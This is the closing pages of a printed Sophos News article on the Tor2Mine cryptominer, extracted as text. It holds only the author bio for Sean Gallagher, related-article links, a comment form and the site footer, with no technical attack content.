+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+7/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+About the Author
+Sean Gallagher
+Sean Gallagher is a Senior Threat Researcher at Sophos.
+Previously, Gallagher was IT and National Security Editor at Ars Technica, where he focused on information security
+and digital privacy issues, cybercrime, cyber espionage and cyber warfare. He has been a security researcher,
+technology journalist and information technology practitioner for over 20 years.
+Read Similar Articles
+MAY 24, 2021
+MAY 19, 2021
+What to expect when you’ve been hit with
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+8/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+y
+p
+Avaddon ransomware
+What’s New in Sophos EDR 4.0
+MAY 19, 2021
+Sophos XDR: Driven by data
+Leave a Reply
+Your email address will not be published. Required ﬁelds are marked *
+Comment *
+Name
+Email
+  Save my name, email, and website in this browser for the next time I comment.
+Post Comment
+Subscribe to get the latest updates in your inbox.
+name@email.com
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+9/10
+2023/1/9 17:20
+Two flavors of Tor2Mine miner dig deep into networks with PowerShell, VBScript – Sophos News
+Which categories are you interested in?
+Products and Services
+Threat Research
+Security Operations
+AI Research
+#SophosLife
+Change Region 
+Terms
+Privacy 
+Legal 
+© 1997 - 2023 Sophos Ltd. All rights reserved
+https://news.sophos.com/en-us/2021/12/02/two-flavors-of-tor2mine-miner-dig-deep-into-networks-with-powershell-vbscript/
+10/10
+Subscribe
